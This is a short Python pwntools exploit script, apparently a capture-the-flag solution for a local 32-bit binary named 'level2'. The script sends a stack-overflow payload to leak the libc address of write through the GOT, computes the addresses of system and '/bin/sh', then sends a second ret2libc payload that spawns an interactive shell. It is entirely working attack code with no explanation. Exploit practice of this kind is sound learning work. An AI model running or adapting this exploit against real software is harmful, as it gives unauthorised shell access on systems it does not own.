from pwn import *
libc = ELF('/lib32/libc.so.6')
elf = ELF('./level2')

p = process('./level2')
plt_write = elf.symbols['write']
got_write = elf.got['write']
vulfun_addr = 0x0804848B 
print(hex(plt_write))
payload1 = b'a'*(0x88+4) + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4)
p.send(payload1)
write_addr = u32(p.recv(4))
print(hex(write_addr))

system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search(b'/bin/sh')))
print(hex(system_addr))
print(hex(binsh_addr))
payload2 = b'a'*(0x88+4)  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)
p.send(payload2)
p.interactive()
